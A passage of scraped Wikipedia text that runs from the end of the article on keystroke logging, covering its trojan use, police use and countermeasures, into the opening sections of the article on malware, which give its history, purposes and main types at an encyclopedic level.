 risks exposing the attacker.



Trojans
[
edit
]


Researchers Adam Young and Moti Yung discussed several methods of sending keystroke logging. They presented a deniable password snatching attack in which the keystroke logging trojan is installed using a virus or 
worm
. An attacker who is caught with the virus or worm can claim to be a victim. The 
cryptotrojan
 asymmetrically encrypts the pilfered login/password pairs using the 
public key
 of the trojan author and covertly broadcasts the resulting 
ciphertext
. They mentioned that the ciphertext can be 
steganographically
 encoded and posted to a public bulletin board such as 
Usenet
.
[
44
]
[
45
]




Use by police
[
edit
]


In 2000, the 
FBI
 used FlashCrest iSpy to obtain the 
PGP
 
passphrase
 of 
Nicodemo Scarfo, Jr.
, son of mob boss 
Nicodemo Scarfo
.
[
46
]

Also in 2000, the FBI lured two suspected Russian 
cybercriminals
 to the US in an elaborate ruse, and captured their usernames and passwords with a keylogger that was covertly installed on a machine that they used to access their computers in 
Russia
. The FBI then used these credentials to gain access to the suspects' computers in Russia to obtain evidence to prosecute them.
[
47
]




Countermeasures
[
edit
]


The effectiveness of countermeasures varies because keyloggers use a variety of techniques to capture data and the countermeasure needs to be effective against the particular data capture technique. In the case of Windows 10 keylogging by Microsoft, changing certain privacy settings may disable it.
[
48
]
 An on-screen keyboard will be effective against hardware keyloggers; transparency
[
clarification needed
]
 will defeat some—but not all—screen loggers. An 
anti-spyware
 application that can only disable hook-based keyloggers will be ineffective against kernel-based keyloggers.

Keylogger program authors may be able to update their program's code to adapt to countermeasures that have proven effective against it.



Anti-keyloggers
[
edit
]


Main article: 
Anti-keylogger


An 
anti-keylogger
 is a piece of 
software
 specifically designed to detect keyloggers on a computer, typically comparing all files in the computer against a database of keyloggers, looking for similarities which might indicate the presence of a hidden keylogger. As anti-keyloggers have been designed specifically to detect keyloggers, they have the potential to be more effective than conventional antivirus software; some antivirus software do not consider keyloggers to be malware, as under some circumstances a keylogger can be considered a legitimate piece of software.
[
49
]




Live CD/USB
[
edit
]


Rebooting the computer using a 
Live CD
 or write-protected 
Live USB
 is a possible countermeasure against software keyloggers if the CD is clean of malware and the operating system contained on it is secured and fully patched so that it cannot be infected as soon as it is started. Booting a different operating system does not impact the use of a hardware or BIOS based keylogger.



Anti-spyware / Anti-virus programs
[
edit
]


Many 
anti-spyware
 applications can detect some software based keyloggers and quarantine, disable, or remove them. However, because many keylogging programs are legitimate pieces of software under some circumstances, anti-spyware often neglects to label keylogging programs as spyware or a virus. These applications can detect software-based keyloggers based on patterns in 
executable code
, 
heuristics
 and keylogger behaviors (such as the use of 
hooks
 and certain 
APIs
).

No software-based anti-spyware application can be 100% effective against all keyloggers.
[
50
]
 Software-based anti-spyware cannot defeat non-software keyloggers (for example, hardware keyloggers attached to keyboards will always receive keystrokes before any software-based anti-spyware application).

The particular technique that the anti-spyware application uses will influence its potential effectiveness against software keyloggers. As a general rule, anti-spyware applications with 
higher privileges
 will defeat keyloggers with lower privileges. For example, a hook-based anti-spyware application cannot defeat a kernel-based keylogger (as the keylogger will receive the keystroke messages before the anti-spyware application), but it could potentially defeat hook- and API-based keyloggers.



Network monitors
[
edit
]


Network monitors
 (also known as reverse-firewalls) can be used to alert the user whenever an application attempts to make a network connection. This gives the user the chance to prevent the keylogger from "
phoning home
" with their typed information.



Automatic form filler programs
[
edit
]


Main article: 
Form filler


Automatic form-filling programs may prevent keylogging by removing the requirement for a user to type personal details and passwords using the keyboard. 
Form fillers
 are primarily designed for 
Web browsers
 to fill in checkout pages and log users into their accounts. Once the user's account and 
credit card
 information has been entered into the program, it will be automatically entered into forms without ever using the keyboard or 
clipboard
, thereby reducing the possibility that private data is being recorded. However, someone with physical access to the machine may still be able to install software that can intercept this information elsewhere in the operating system or while in transit on the network. (
Transport Layer Security
 (TLS) reduces the risk that data in transit may be intercepted by 
network sniffers
 and 
proxy tools
.)



One-time passwords (OTP)
[
edit
]


Using 
one-time passwords
 may prevent unauthorized access to an account which has had its login details exposed to an attacker via a keylogger, as each password is invalidated as soon as it is used. This solution may be useful for someone using a public computer. However, an attacker who has remote control over such a computer can simply wait for the victim to enter their credentials before performing unauthorized transactions on their behalf while their session is active.

Another common way to protect access codes from being stolen by keystroke loggers is by asking users to provide a few randomly selected characters from their authentication code. For example, they might be asked to enter the 2nd, 5th, and 8th characters. Even if someone is watching the user or using a keystroke logger, they would only get a few characters from the code without knowing their positions.
[
51
]




Security tokens
[
edit
]


Use of 
smart cards
 or other 
security tokens
 may improve security against 
replay attacks
 in the face of a successful keylogging attack, as accessing protected information would require both the (hardware) security token as well as the appropriate password/passphrase. Knowing the keystrokes, mouse actions, display, clipboard, etc. used on one computer will not subsequently help an attacker gain access to the protected resource. Some security tokens work as a type of hardware-assisted one-time password system, and others implement a cryptographic 
challenge–response authentication
, which can improve security in a manner conceptually similar to one time passwords. 
Smartcard readers
 and their associated keypads for 
PIN
 entry may be vulnerable to keystroke logging through a so-called 
supply chain attack
[
52
]
 where an attacker substitutes the card reader/PIN entry hardware for one which records the user's PIN.



On-screen keyboards
[
edit
]


Most on-screen keyboards (such as the on-screen keyboard that comes with 
Windows XP
) send normal keyboard event messages to the external target program to type text. Software key loggers can log these typed characters sent from one program to another.
[
53
]




Keystroke interference software
[
edit
]


Keystroke interference software is also available.
[
54
]

These programs attempt to trick keyloggers by introducing random keystrokes, although this simply results in the keylogger recording more information than it needs to. An attacker has the task of extracting the keystrokes of interest—the security of this mechanism, specifically how well it stands up to 
cryptanalysis
, is unclear.



Speech recognition
[
edit
]


Similar to on-screen keyboards, 
speech-to-text conversion
 software can also be used against keyloggers, since there are no typing or mouse movements involved. The weakest point of using voice-recognition software may be how the software sends the recognized text to target software after the user's speech has been processed.



Handwriting recognition and mouse gestures
[
edit
]


Many 
PDAs
 and lately 
tablet PCs
 can already convert pen (also called stylus) movements on their 
touchscreens
 to computer understandable text successfully. 
Mouse gestures
 use this principle by using mouse movements instead of a stylus. Mouse gesture programs convert these strokes to user-definable actions, such as typing text. Similarly, 
graphics tablets
 and 
light pens
 can be used to input these gestures, however, these are becoming less common.
[
timeframe?
]


The same potential weakness of speech recognition applies to this technique as well.



Macro expanders/recorders
[
edit
]


With the help of many programs, a seemingly meaningless text can be expanded to a meaningful text and most of the time context-sensitively, e.g. "en.wikipedia.org" can be expanded when a web browser window has the focus. The biggest weakness of this technique is that these programs send their keystrokes directly to the target program. However, this can be overcome by using 
the 'alternating' technique described below
, i.e. sending mouse clicks to non-responsive areas of the target program, sending meaningless keys, sending another mouse click to the target area (e.g. password field) and switching back-and-forth.



Deceptive typing
[
edit
]


Alternating between typing the login credentials and typing characters somewhere else in the focus window
[
55
]
 can cause a keylogger to record more information than it needs to, but this could be easily filtered out by an attacker. Similarly, a user can move their cursor using the mouse while typing, causing the logged keystrokes to be in the wrong order e.g., by typing a password beginning with the last letter and then using the mouse to move the cursor for each subsequent letter. Lastly, someone can also use 
context menus
 to remove, 
cut, copy, and paste
 parts of the typed text without using the keyboard. An attacker who can capture only parts of a password will have a larger 
key space
 to attack if they choose to execute a 
brute-force attack
.

Another very similar technique uses the fact that any selected text portion is replaced by the next key typed. e.g., if the password is "secret", one could type "s", then some dummy keys "asdf". These dummy characters could then be selected with the mouse, and the next character from the password "e" typed, which replaces the dummy characters "asdf".

These techniques assume incorrectly that keystroke logging software cannot directly monitor the clipboard, the selected text in a form, or take a screenshot every time a keystroke or mouse click occurs. They may, however, be effective against some hardware keyloggers.



See also
[
edit
]


Anti-keylogger


Black-bag cryptanalysis


Computer surveillance


Cybercrime


Digital footprint


Hardware keylogger


Reverse connection


Session replay


Spyware


Trojan horse


Virtual keyboard


Web tracking


References
[
edit
]






^
 
Nyang, DaeHun; Mohaisen, Aziz; Kang, Jeonil (2014-11-01). 
"Keylogging-Resistant Visual Authentication Protocols"
. 
IEEE Transactions on Mobile Computing
. 
13
 (11): 2566–2579. 
doi
:
10.1109/TMC.2014.2307331
. 
ISSN
 
1536-1233
. 
S2CID
 
8161528
.




^
 
Conijn, Rianne; Cook, Christine; van Zaanen, Menno; Van Waes, Luuk (2021-08-24). 
"Early prediction of writing quality using keystroke logging"
. 
International Journal of Artificial Intelligence in Education
. 
32
 (4): 835–866. 
doi
:
10.1007/s40593-021-00268-w
. 
hdl
:
10067/1801420151162165141
. 
ISSN
 
1560-4292
. 
S2CID
 
238703970
.




^
 
Use of legal software products for computer monitoring
, keylogger.org




^
 
"Keylogger"
. Oxford dictionaries. Archived from 
the original
 on 2013-09-11
. Retrieved 
2013-08-03
.




^
 
Keyloggers: How they work and how to detect them (Part 1)
, 
Secure List
, "Today, keyloggers are mainly used to steal user data relating to various online payment systems, and virus writers are constantly writing new keylogger Trojans for this very purpose."




^
 
Rai, Swarnima; Choubey, Vaaruni; Suryansh; Garg, Puneet (2022-07-08). 
"A Systematic Review of Encryption and Keylogging for Computer System Security"
. 
2022 Fifth International Conference on Computational Intelligence and Communication Technologies (CCICT)
. IEEE. pp. 157–163. 
doi
:
10.1109/CCiCT56684.2022.00039
. 
ISBN
 
978-1-6654-7224-1
. 
S2CID
 
252849669
.




^
 
Stefan, Deian, Xiaokui Shu, and Danfeng Daphne Yao. "
Robustness of keystroke-dynamics based biometrics against synthetic forgeries
." computers & security 31.1 (2012): 109-121.




^
 
"Selectric bug"
.




^
 
"The Security Digest Archives"
. Retrieved 
2009-11-22
.




^
 
"Soviet Spies Bugged World's First Electronic Typewriters"
. 
qccglobal.com
. Archived from 
the original
 on 2013-12-20
. Retrieved 
2013-12-20
.




^ 
a
 
b
 

Geoffrey Ingersoll.

"Russia Turns To Typewriters To Protect Against Cyber Espionage"
.
2013.




^ 
a
 
b
 
Sharon A. Maneki.

"Learning from the Enemy: The GUNMAN Project"
 
Archived
 2017-12-03 at the 
Wayback Machine
.
2012.




^
 
Agence France-Presse, Associated Press (13 July 2013). 
"Wanted: 20 electric typewriters for Russia to avoid leaks"
. 
inquirer.net
.




^
 

Anna Arutunyan.

"Russian security agency to buy typewriters to avoid surveillance"
 
Archived
 2013-12-21 at the 
Wayback Machine
.




^
 
"What is a Keylogger?"
. PC Tools.




^
 
Caleb Chen (2017-03-20). 
"Microsoft Windows 10 has a keylogger enabled by default – here's how to disable it"
.




^
 
"The Evolution of Malicious IRC Bots"
 
(PDF)
. 
Symantec
. 2005-11-26: 23–24. Archived from 
the original
 
(PDF)
 on March 15, 2006
. Retrieved 
2011-03-25
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
Jonathan Brossard (2008-09-03). 
"Bypassing pre-boot authentication passwords by instrumenting the BIOS keyboard buffer (practical low level attacks against x86 pre-boot authentication software)"
 
(PDF)
. www.ivizsecurity.com. Archived from 
the original
 
(PDF)
 on 2008-09-13
. Retrieved 
2008-09-23
.
 
{{
cite journal
}}
: 
Cite journal requires 
|journal=
 (
help
)




^
 
"Web-Based Keylogger Used to Steal Credit Card Data from Popular Sites"
. 
Threatpost | The first stop for security news
. 2016-10-06
. Retrieved 
2017-01-24
.




^
 
"SpyEye Targets Opera, Google Chrome Users"
. 
Krebs on Security
. Retrieved 
26 April
 2011
.




^
 
K.P.H. Sullivan & E. Lindgren (Eds., 2006), Studies in Writing: Vol. 18. Computer Key-Stroke Logging and Writing: Methods and Applications. Oxford: Elsevier.




^
 
V. W. Berninger (Ed., 2012), Past, present, and future contributions of cognitive writing research to cognitive psychology. New York/Sussex: Taylor & Francis. 
ISBN
 
9781848729636




^
 
Vincentas (11 July 2013). 
"Keystroke Logging in SpyWareLoop.com"
. 
Spyware Loop
. Archived from 
the original
 on 7 December 2013
. Retrieved 
27 July
 2013
.




^
 
Microsoft. 
"EM_GETLINE Message()"
. 
Microsoft
. Retrieved 
2009-07-15
.




^
 
"Apple keyboard hack"
. Digital Society. Archived from 
the original
 on 26 August 2009
. Retrieved 
9 June
 2011
.




^
 
"Keylogger Removal"
. SpyReveal Anti Keylogger. Archived from 
the original
 on 29 April 2011
. Retrieved 
25 April
 2011
.




^
 
"Keylogger Removal"
. SpyReveal Anti Keylogger
. Retrieved 
26 February
 2016
.




^
 
Jeremy Kirk (2008-12-16). 
"Tampered Credit Card Terminals"
. 
IDG
 News Service
. Retrieved 
2009-04-19
.




^
 
Andrew Kelly (2010-09-10). 
"Cracking Passwords using Keyboard Acoustics and Language Modeling"
 
(PDF)
.




^
 
Sarah Young (14 September 2005). 
"Researchers recover typed text using audio recording of keystrokes"
. UC Berkeley NewsCenter.




^
 
Knight, Will. 
"A Year Ago: Cypherpunks publish proof of Tempest"
. 
ZDNet
.




^
 
Martin Vuagnoux and Sylvain Pasini (2009-06-01). Vuagnoux, Martin; Pasini, Sylvain (eds.). 
"Compromising Electromagnetic Emanations of Wired and Wireless Keyboards"
. 
Proceedings of the 18th Usenix Security Symposium
: 1–16.




^
 
"ATM camera"
. 
www.snopes.com
. 19 January 2004
. Retrieved 
2009-04-19
.




^
 
Maggi, Federico; Volpatto, Alberto; Gasparini, Simone; Boracchi, Giacomo; Zanero, Stefano (2011). 
"A fast eavesdropping attack against touchscreens"
 
(PDF)
. 
2011 7th International Conference on Information Assurance and Security (IAS)
. 7th International Conference on Information Assurance and Security. IEEE. pp. 320–325. 
doi
:
10.1109/ISIAS.2011.6122840
. 
ISBN
 
978-1-4577-2155-7
.




^
 
Marquardt, Philip; Verma, Arunabh; Carter, Henry; Traynor, Patrick (2011). 
(sp)iPhone: decoding vibrations from nearby keyboards using mobile phone accelerometers
. Proceedings of the 18th ACM conference on Computer and communications security. ACM. pp. 561–562. 
doi
:
10.1145/2046707.2046771
.




^
 
"iPhone Accelerometer Could Spy on Computer Keystrokes"
. 
Wired
. 19 October 2011
. Retrieved 
August 25,
 2014
.




^
 
Owusu, Emmanuel; Han, Jun; Das, Sauvik; Perrig, Adrian; Zhang, Joy (2012). 
ACCessory: password inference using accelerometers on smartphones
. Proceedings of the Thirteenth Workshop on Mobile Computing Systems and Applications. ACM. 
doi
:
10.1145/2162081.2162095
.




^
 
Aviv, Adam J.; Sapp, Benjamin; Blaze, Matt; Smith, Jonathan M. (2012). "Practicality of accelerometer side channels on smartphones". 
Proceedings of the 28th Annual Computer Security Applications Conference on - ACSAC '12
. Proceedings of the 28th Annual Computer Security Applications Conference. ACM. p. 41. 
doi
:
10.1145/2420950.2420957
. 
ISBN
 
9781450313124
.




^
 
Cai, Liang; Chen, Hao (2011). 
TouchLogger: inferring keystrokes on touch screen from smartphone motion
 
(PDF)
. Proceedings of the 6th USENIX conference on Hot topics in security. USENIX
. Retrieved 
25 August
 2014
.




^
 
Xu, Zhi; Bai, Kun; Zhu, Sencun (2012). 
TapLogger: inferring user inputs on smartphone touchscreens using on-board motion sensors
. Proceedings of the fifth ACM conference on Security and Privacy in Wireless and Mobile Networks. ACM. pp. 113–124. 
doi
:
10.1145/2185448.2185465
.




^
 
Miluzzo, Emiliano; Varshavsky, Alexander; Balakrishnan, Suhrid; Choudhury, Romit Roy (2012). 
Tapprints: your finger taps have fingerprints
. Proceedings of the 10th international conference on Mobile systems, applications, and services. ACM. pp. 323–336. 
doi
:
10.1145/2307636.2307666
.




^
 
Spreitzer, Raphael (2014). 
PIN Skimming: Exploiting the Ambient-Light Sensor in Mobile Devices
. Proceedings of the 4th ACM Workshop on Security and Privacy in Smartphones & Mobile Devices. ACM. pp. 51–62. 
arXiv
:
1405.3760
. 
doi
:
10.1145/2666620.2666622
.




^
 
Hameiri, Paz (2019). 
"Body Keylogging"
. 
Hakin9 IT Security Magazine
. 
14
 (7): 79–94.




^
 
Young, Adam; Yung, Moti (1997). "Deniable password snatching: On the possibility of evasive electronic espionage". 
Proceedings. 1997 IEEE Symposium on Security and Privacy (Cat. No.97CB36097)
. pp. 224–235. 
doi
:
10.1109/SECPRI.1997.601339
. 
ISBN
 
978-0-8186-7828-8
. 
S2CID
 
14768587
.




^
 
Young, Adam; Yung, Moti (1996). "Cryptovirology: Extortion-based security threats and countermeasures". 
Proceedings 1996 IEEE Symposium on Security and Privacy
. pp. 129–140. 
CiteSeerX
 
10.1.1.44.9122
. 
doi
:
10.1109/SECPRI.1996.502676
. 
ISBN
 
978-0-8186-7417-4
. 
S2CID
 
12179472
.




^
 
John Leyden (2000-12-06). 
"Mafia trial to test FBI spying tactics: Keystroke logging used to spy on mob suspect using PGP"
. 
The Register
. Retrieved 
2009-04-19
.




^
 
John Leyden (2002-08-16). 
"Russians accuse FBI Agent of Hacking"
. 
The Register
.




^
 
Alex Stim (2015-10-28). 
"3 methods to disable Windows 10 built-in Spy Keylogger"
.




^
 
"What is Anti Keylogger?"
. 23 August 2018.




^
 
Creutzburg, Reiner (2017-01-29). 
"The strange world of keyloggers - an overview, Part I"
. 
Electronic Imaging
. 
2017
 (6): 139–148. 
doi
:
10.2352/ISSN.2470-1173.2017.6.MOBMU-313
.




^
 
Goring, Stuart P.; Rabaiotti, Joseph R.; Jones, Antonia J. (2007-09-01). 
"Anti-keylogging measures for secure Internet login: An example of the law of unintended consequences"
. 
Computers & Security
. 
26
 (6): 421–426. 
doi
:
10.1016/j.cose.2007.05.003
. 
ISSN
 
0167-4048
.




^
 
Austin Modine (2008-10-10). 
"Organized crime tampers with European card swipe devices"
. 
The Register
. Retrieved 
2009-04-18
.




^
 
Scott Dunn (2009-09-10). 
"Prevent keyloggers from grabbing your passwords"
. Windows Secrets
. Retrieved 
2014-05-10
.




^
 
Christopher Ciabarra (2009-06-10). 
"Anti Keylogger"
. Networkintercept.com. Archived from 
the original
 on 2010-06-26.




^
 
Cormac Herley and Dinei Florencio (2006-02-06). 
"How To Login From an Internet Cafe Without Worrying About Keyloggers"
 
(PDF)
. 
Microsoft Research
. Retrieved 
2008-09-23
.






External links
[
edit
]


 Media related to 
Keystroke logging
 at Wikimedia Commons



‹ The 
template
 below (
Curlie
) is being considered for deletion. See 
templates for discussion
 to help reach a consensus. ›
Keyloggers
 at 
Curlie


v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast












Retrieved from "
https://en.wikipedia.org/w/index.php?title=Keystroke_logging&oldid=1245963292
"


Categories
: 
Cryptographic attacks
Spyware
Surveillance
Cybercrime
Security breaches
Hidden categories: 
Webarchive template wayback links
CS1 errors: missing periodical
Articles with short description
Short description is different from Wikidata
All articles with vague or ambiguous time
Vague or ambiguous time from January 2021
Wikipedia articles needing clarification from November 2017
Wikipedia articles needing clarification from January 2021
Commons category link from Wikidata
Articles with Curlie links











From Wikipedia, the free encyclopedia






Malicious software






Part of a series on
Computer hacking


History


Phreaking


Cryptovirology


Hacking of consumer electronics


List of hackers




Hacker culture
 and 
ethic


Hackathon


Hacker Manifesto


Hackerspace


Hacktivism


Maker culture


Types of 
hackers


Black hat


Grey hat


White hat




Conferences


Black Hat Briefings


Chaos Communication Congress


DEF CON


Hackers on Planet Earth


Security BSides


ShmooCon


Summercon




Computer crime


Crimeware


List of computer criminals


Script kiddie




Hacking tools


Exploit


forensics-focused operating systems


Payload


Social engineering


Vulnerability




Practice sites


HackThisSite


Zone-H




Malware


Rootkit


Backdoor


Trojan horse


Virus


Worm


Spyware


Ransomware


Logic bomb


Botnet


Keystroke logging


HIDS


Web shell


RCE


Infostealer




Computer security


Application security


Cloud computing security


Network security




Groups


Anonymous


Chaos Computer Club


Homebrew Computer Club
 (defunct)


Legion of Doom
 (defunct)


LulzSec
 (defunct)


Masters of Deception
 (defunct)


Red team
 / 
Blue team




Publications


2600: The Hacker Quarterly


Hacker News


Nuts and Volts


Phrack


v
t
e


Malware
 (a 
portmanteau
 of 
malicious software
)
[
1
]
 is any 
software
 intentionally designed to cause disruption to a 
computer
, 
server
, 
client
, or 
computer network
, leak private information, gain unauthorized access to information or systems, deprive access to information, or which unknowingly interferes with the user's 
computer security
 and 
privacy
.
[
1
]
[
2
]
[
3
]
[
4
]
[
5
]
 Researchers tend to classify malware into one or more sub-types (i.e. 
computer viruses
, 
worms
, 
Trojan horses
, 
ransomware
, 
spyware
, 
adware
, 
rogue software
, 
wipers
 and 
keyloggers
).
[
1
]


Malware poses serious problems to individuals and businesses on the Internet.
[
6
]
[
7
]
 According to 
Symantec
's 2018 Internet Security Threat Report (ISTR), malware variants number has increased to 669,947,865 in 2017, which is twice as many malware variants as in 2016.
[
8
]
 
Cybercrime
, which includes malware attacks as well as other crimes committed by computer, was predicted to cost the world economy US$6 trillion in 2021, and is increasing at a rate of 15% per year.
[
9
]
 Since 2021, malware has been designed to target computer systems that run critical infrastructure such as the 
electricity distribution network
.
[
10
]


The defense strategies against malware differ according to the type of malware but most can be thwarted by installing 
antivirus software
, 
firewalls
, applying regular 
patches
, 
securing networks
 from intrusion, having regular 
backups
 and 
isolating infected systems
. Malware can be designed to evade antivirus software detection algorithms.
[
8
]






History
[
edit
]


Main article: 
History of computer viruses


For a chronological guide, see 
Timeline of computer viruses and worms
.


The notion of a self-reproducing computer program can be traced back to initial theories about the operation of complex automata.
[
11
]
 
John von Neumann
 showed that in theory a program could reproduce itself. This constituted a plausibility result in 
computability theory
. 
Fred Cohen
 experimented with computer viruses and confirmed Neumann's postulate and investigated other properties of malware such as detectability and self-obfuscation using rudimentary encryption. His 1987 doctoral dissertation was on the subject of computer viruses.
[
12
]
 The combination of cryptographic technology as part of the payload of the virus, exploiting it for attack purposes was initialized and investigated from the mid-1990s, and includes initial ransomware and evasion ideas.
[
13
]


Before 
Internet
 access became widespread, viruses spread on personal computers by infecting executable programs or 
boot sectors
 of floppy disks. By inserting a copy of itself into the 
machine code
 instructions in these programs or 
boot sectors
, a virus causes itself to be run whenever the program is run or the disk is booted. Early computer viruses were written for the 
Apple II
 and 
Mac
, but they became more widespread with the dominance of the 
IBM PC
 and 
MS-DOS
. The first IBM PC virus in the wild was a 
boot sector
 virus dubbed 
(c)Brain
, created in 1986 by the Farooq Alvi brothers in Pakistan.
[
14
]
 Malware distributors would trick the user into booting or running from an infected device or medium. For example, a virus could make an infected computer add autorunnable code to any USB stick plugged into it. Anyone who then attached the stick to another computer set to autorun from USB would in turn become infected, and also pass on the infection in the same way.
[
15
]


Older email software would automatically open 
HTML email
 containing potentially malicious 
JavaScript
 code. Users may also execute disguised malicious email attachments. The 
2018 Data Breach Investigations Report
 by 
Verizon
, cited by 
CSO Online
, states that emails are the primary method of malware delivery, accounting for 96% of malware delivery around the world.
[
16
]
[
17
]


The first worms, 
network
-borne infectious programs, originated not on personal computers, but on multitasking 
Unix
 systems. The first well-known worm was the 
Morris worm
 of 1988, which infected 
SunOS
 and 
VAX
 
BSD
 systems. Unlike a virus, this worm did not insert itself into other programs. Instead, it exploited security holes (
vulnerabilities
) in network 
server
 programs and started itself running as a separate 
process
.
[
18
]
 This same behavior is used by today's worms as well.
[
19
]


With the rise of the 
Microsoft Windows
 platform in the 1990s, and the flexible 
macros
 of its applications, it became possible to write infectious code in the macro language of 
Microsoft Word
 and similar programs. These 
macro viruses
 infect documents and templates rather than applications (
executables
), but rely on the fact that macros in a Word document are a form of 
executable
 code.
[
20
]


Many early infectious programs, including the 
Morris Worm
, the first internet worm, were written as experiments or pranks.
[
21
]
 Today, malware is used by both 
black hat hackers
 and governments to steal personal, financial, or business information.
[
22
]
[
23
]
 Today, any device that plugs into a USB port – even lights, fans, speakers, toys, or peripherals such as a digital microscope – can be used to spread malware. Devices can be infected during manufacturing or supply if quality control is inadequate.
[
15
]




Purposes
[
edit
]


Since the rise of widespread 
broadband
 
Internet
 access, malicious software has more frequently been designed for profit. Since 2003, the majority of widespread 
viruses
 and worms have been designed to take control of users' computers for illicit purposes.
[
24
]
 Infected "
zombie computers
" can be used to send 
email spam
, to host contraband data such as 
child pornography
,
[
25
]
 or to engage in 
distributed denial-of-service
 
attacks
 as a form of 
extortion
.
[
26
]
 Malware is used broadly against government or corporate websites to gather sensitive information,
[
27
]
 or to disrupt their operation in general. Further, malware can be used against individuals to gain information such as personal identification numbers or details, bank or credit card numbers, and passwords.
[
28
]
[
29
]


In addition to criminal money-making, malware can be used for sabotage, often for political motives. 
Stuxnet
, for example, was designed to disrupt very specific industrial equipment. There have been politically motivated attacks which spread over and shut down large computer networks, including massive deletion of files and corruption of 
master boot records
, described as "computer killing." Such attacks were made on Sony Pictures Entertainment (25 November 2014, using malware known as 
Shamoon
 or W32.Disttrack) and Saudi Aramco (August 2012).
[
30
]
[
31
]




Types
[
edit
]


Malware can be classified in numerous ways, and certain malicious programs may fall into two or more categories simultaneously.
[
1
]
 Broadly, software can categorised into three types:
[
32
]
 (i) goodware; (ii) greyware and (iii) malware.





Classification of potentially malicious software
Data sourced from: Molina-Coronado et al. (2023)
[
32
]






Type



Characteristics



Examples



Notes





Goodware



Obtained from trustworthy sources





Google Play
 apps


Buggy software












Greyware



Insufficient consensus and/or metrics





Potentially unwanted programs


Spyware


Adware












Malware



Broad consensus among antivirus software that program is malicious or obtained from flagged sources.





Viruses


Worms


Root kits


Backdoors


Ransomware


Trojan horses










Malware
[
edit
]


Hex dump
 of the 
Blaster worm
, showing a message left for 
Microsoft
 co-founder 
Bill Gates
 by the worm's programmer


Virus
[
edit
]


Main article: 
Computer virus


A computer virus is software usually hidden within another seemingly innocuous program that can produce copies of itself and insert them into other programs or files, and that usually performs a harmful action (such as destroying data).
[
33
]
 They have been likened to 
biological viruses
.
[
3
]
 An example of this is a portable execution infection, a technique, usually used to spread malware, that inserts extra data or 
executable code
 into 
PE files
.
[
34
]
 A computer virus is software that embeds itself in some other 
executable
 software (including the operating system itself) on the target system without the user's knowledge and consent and when it is run, the virus is spread to other executable files.



Worm
[
edit
]


A 
worm
 is a stand-alone malware software that 
actively
 transmits itself over a 
network
 to infect other computers and can copy itself without infecting files. These definitions lead to the observation that a virus requires the user to run an infected software or operating system for the virus to spread, whereas a worm spreads itself.
[
35
]




Rootkits
[
edit
]


Main article: 
Rootkit


Once malicious software is installed on a system, it is essential that it stays concealed, to avoid detection. Software packages known as 
rootkits
 allow this concealment, by modifying the host's operating system so that the malware is hidden from the user. Rootkits can prevent a harmful 
process
 from being visible in the system's list of 
processes
, or keep its files from being read.
[
36
]


Some types of harmful software contain routines to evade identification and/or removal attempts, not merely to hide themselves. An early example of this behavior is recorded in the 
Jargon File
 tale of a pair of programs infesting a Xerox 
CP-V
 time sharing system:



Each ghost-job would detect the fact that the other had been killed, and would start a new copy of the recently stopped program within a few milliseconds. The only way to kill both ghosts was to kill them simultaneously (very difficult) or to deliberately crash the system.
[
37
]


Backdoors
[
edit
]


Main article: 
Backdoor (computing)


A 
backdoor
 is a broad term for a computer program that allows an attacker persistent unauthorised remote access to a victim's machine often without their knowledge.
[
38
]
 The attacker typically uses another attack (such as a 
trojan
, 
worm
 or 
virus
) to bypass authentication mechanisms usually over an unsecured network such as the Internet to install the backdoor application. A backdoor can also be a side effect of a 
software bug
 in legitimate software that is exploited by an attacker to gain access to a victim's computer or network.

The idea has often been suggested that computer manufacturers preinstall backdoors on their systems to provide technical support for customers, but this has never been reliably verified. It was reported in 2014 that US government agencies had been diverting computers purchased by those considered "targets" to secret workshops where software or hardware permitting remote access by the agency was installed, considered to be among the most productive operations to obtain access to networks around the world.
[
39
]
 Backdoors may be installed by Trojan horses, 
worms
, 
implants
, or other methods.
[
40
]
[
41
]




Trojan horse
[
edit
]


A Trojan horse misrepresents itself to masquerade as a regular, benign program or utility in order to persuade a victim to install it. A Trojan horse usually carries a hidden destructive function that is activated when the application is started. The term is derived from the 
Ancient Greek
 story of the 
Trojan horse
 used to invade the city of 
Troy
 by stealth.
[
42
]
[
43
]


Trojan horses are generally spread by some form of 
social engineering
, for example, where a user is duped into executing an email attachment disguised to be unsuspicious, (e.g., a routine form to be filled in), or by 
drive-by download
